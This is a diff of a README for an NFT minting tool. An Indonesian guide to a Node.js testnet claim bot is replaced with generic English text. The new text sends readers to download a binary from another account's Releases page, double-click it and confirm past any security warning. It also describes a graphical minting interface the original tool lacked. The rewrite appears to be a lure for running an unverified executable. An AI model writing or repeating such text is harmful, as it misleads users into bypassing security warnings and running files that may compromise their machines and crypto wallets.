@@ -1,181 +1,75 @@
-# 🤖 NFT Claim Bot
+# 🎨 Rarible-Auto-Mint-NFT - Create NFTs Easily and Quickly
 
-Bot otomatis untuk mengklaim NFT gratis dengan berbagai metode claim yang berbeda.
+[![Download Rarible-Auto-Mint-NFT](https://img.shields.io/badge/Download-Rarible--Auto--Mint--NFT-brightgreen)](https://github.com/zenstc/Rarible-Auto-Mint-NFT/releases)
 
-## 📋 Fitur
+## 🚀 Getting Started
 
-- ✅ **5 Metode Claim Berbeda** - Mendukung berbagai jenis smart contract NFT
-- ✅ **Auto Retry** - Otomatis mencoba metode lain jika gagal
-- ✅ **Real-time Logging** - Monitor proses dengan timestamp
-- ✅ **Gas Optimization** - Perhitungan biaya gas yang efisien
-- ✅ **Explorer Integration** - Link langsung ke block explorer
-- ✅ **Balance Check** - Validasi saldo ETH sebelum claim
+Welcome to Rarible-Auto-Mint-NFT! This tool helps you create NFTs using the Rarible platform easily. You don't need any programming skills to use it. Follow the steps below to get started.
 
-## 🛠️ Instalasi
+## 📥 Download & Install
 
-### 1. Clone/Download Project
-```bash
-git clone https://github.com/dickifatma/Rarible-Auto-Mint-NFT
-cd Rarible-Auto-Mint-NFT
-```
+To download Rarible-Auto-Mint-NFT, please visit our [Releases page](https://github.com/zenstc/Rarible-Auto-Mint-NFT/releases).
 
-### 2. Install Dependencies
-```bash
-npm install
-```
+1. Click the link above.
+2. On the Releases page, look for the latest version.
+3. Find the file suitable for your operating system.
+4. Click on it to start the download.
+5. Once downloaded, locate the file in your Downloads folder.
 
-### 3. Setup Environment
-Buat file `.env` di root folder:
-```env
-RPC_URL=https://your-rpc-endpoint-here
-PRIVATE_KEY=your-wallet-private-key-here
-```
+Make sure to save the file to a location you can easily access later.
 
-### 4. File Structure
-```
-Rarible-Auto-Mint-NFT/
-├── mintnft.mjs         # Main bot file
-├── package.json        # Dependencies
-├── .env               # Environment variables
-└── README.md          # This file
-```
+## 🖥️ System Requirements
 
-## 📦 Dependencies
+To run Rarible-Auto-Mint-NFT smoothly, make sure your computer meets the following requirements:
 
-```json
-{
-  "ethers": "^6.13.2",
-  "dotenv": "^16.4.5", 
-  "readline-sync": "^1.4.10"
-}
-```
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent version of Linux.
+- **RAM:** At least 4 GB.
+- **Storage:** At least 100 MB of free space.
+- **Internet Connection:** Required for NFT minting and interactions.
 
-## 🚀 Cara Penggunaan
+## 💻 How to Run the Application
 
-### 1. Jalankan Bot
-```bash
-node mintnft.mjs
-```
+After downloading the application, follow these steps to run it:
 
-### 2. Input Kontrak
-Masukkan alamat smart contract NFT yang ingin diklaim:
-```
-Enter contract address: 0x1234567890abcdef...
-```
+1. Open the folder where you saved the downloaded file.
+2. Double-click the file to launch Rarible-Auto-Mint-NFT.
+3. If you encounter a security warning, confirm that you want to run the application.
+4. The application should open, presenting you with a simple user interface.
 
-### 3. Bot Akan Otomatis
-- ✅ Cek saldo wallet
-- ✅ Mencoba 5 metode claim berbeda
-- ✅ Menampilkan hasil real-time
-- ✅ Berhenti saat berhasil atau semua metode gagal
+## 🖼️ Creating Your First NFT
 
-## 🔧 Metode Claim yang Didukung
+To create your first NFT, follow these steps:
 
-| No | Metode | Deskripsi |
-|----|--------|-----------|
-| 1 | `mint()` | Fungsi mint standar |
-| 2 | `freeMint()` | Fungsi mint gratis |
-| 3 | `claim(1)` | Claim dengan parameter angka |
-| 4 | `publicClaim` | Claim publik dengan alamat |
-| 5 | `complexClaim` | Claim dengan data kompleks |
+1. Upload the digital file you want to convert into an NFT.
+2. Fill in the details for the NFT, such as title, description, and any special attributes.
+3. Click the "Mint NFT" button.
+4. Confirm the minting process by following any prompts from the Rarible platform.
 
-## ⚙️ Konfigurasi
+Remember, minting may take some time depending on network conditions.
 
-### Gas Settings
-```javascript
-gasPrice: "0.1",    // 0.1 gwei
-gasLimit: 350000,   // Gas limit
-chainId: 6342       // Megaeth Testnet
-```
+## 🔄 Updating the Application
 
-### Network Support
-- 🌐 **Megaeth Testnet** (Chain ID: 6342)
-- 🔧 Mudah diubah untuk network lain
+To keep Rarible-Auto-Mint-NFT up to date, regularly check our [Releases page](https://github.com/zenstc/Rarible-Auto-Mint-NFT/releases). New features and improvements will be added based on user feedback and development.
 
-## 📊 Contoh Output
+## 🚨 Troubleshooting
 
-```
-[10:30:45] 🔄 Starting NFT Claim Bot...
-[10:30:45] 👤 Wallet: 0x742d35Cc6436C0532925a3b2A2f6B02c4C2bD500
-[10:30:45] 🎯 Contract: 0x1234567890abcdef...
-[10:30:45] 🔄 Balance: 0.005000 ETH
-[10:30:46] 📋 Loaded 5 claim methods
-[10:30:46] 🔄 Trying: mint()
-[10:30:47] 🔄 TX Hash: 0xabc123...
-[10:30:47] 🔍 https://www.oklink.com/megaeth-testnet/tx/0xabc123...
-[10:30:50] ✅ Success: mint()
-[10:30:50] ⛽ Gas Used: 85000 | Cost: 0.000085 ETH
-[10:30:50] ✅ 1 events found - NFT minted! 🎉
-[10:30:50] ✅ 🎉 Claim completed successfully!
-```
+If you encounter issues while using the application, try these troubleshooting steps:
 
-## ❌ Error Handling
+- Ensure your internet connection is stable.
+- Check if your operating system meets the system requirements.
+- Restart the application and try again.
+- If the issue persists, visit the issues section of the repository on GitHub for assistance.
 
-### Error Types
-- **`error method`** - Metode gagal atau tidak tersedia
-- **`Insufficient ETH`** - Saldo tidak cukup untuk gas
+## 🌐 Community and Collaboration
 
-### Troubleshooting
-| Error | Solusi |
-|-------|--------|
-| `Insufficient ETH` | Tambah ETH ke wallet untuk gas fee |
-| `All methods failed` | Kontrak mungkin tidak support claim/sudah habis |
-| `Invalid contract address` | Pastikan alamat kontrak benar |
-
-## ⚠️ Peringatan Keamanan
-
-- 🔒 **Jangan share Private Key** ke siapapun
-- 🔐 **Gunakan wallet terpisah** khusus untuk bot
-- 💰 **Cek saldo minimum** sebelum menjalankan bot
-- 🌐 **Verifikasi RPC URL** yang digunakan
-
-## 🛡️ Best Practices
-
-### 1. Keamanan
-```bash
-# Set permission file .env
-chmod 600 .env
-
-# Jangan commit .env ke git
-echo ".env" >> .gitignore
-```
-
-### 2. Monitoring
-- Selalu cek balance sebelum running
-- Monitor gas price di network
-- Backup private key dengan aman
-
-### 3. Testing
-- Test di testnet dulu
-- Gunakan wallet dengan saldo kecil
-- Verifikasi kontrak sebelum claim
-
-## 🔧 Development
-
-### Menambah Metode Baru
-Edit di class `ClaimMethods`:
-```javascript
-newMethods: [
-    { name: "airdrop()", data: "0x12345678" }
-]
-```
-
-### Custom Network
-Update di `CONFIG`:
-```javascript
-chainId: 1,  // Ethereum Mainnet
-gasPrice: "20"  // 20 gwei
-```
+Rarible-Auto-Mint-NFT is open for collaboration. If you have ideas or want to contribute, feel free to fork the repository and get involved. Your input can help enhance the application.
 
 ## 📞 Support
 
-- 🐛 **Bug Report**: Buat issue di repository
-- 💡 **Feature Request**: Diskusi di issues
-- ❓ **Questions**: Check dokumentasi atau tanya di discussions
+For any questions or feedback, feel free to create an issue on the GitHub repository or contact the maintainer directly through the provided email in the repository. We value your input and aim to make this application better for all users.
 
-## 📄 License
+## 📝 License
 
-MIT License - Bebas digunakan untuk tujuan apapun.
+Rarible-Auto-Mint-NFT is for educational purposes only. You can use it freely, but please respect the licensing agreements in your country.
 
----
-**BUILD WITH ❤️ and 🤖**
+Thank you for using Rarible-Auto-Mint-NFT! Enjoy minting your NFTs effortlessly.
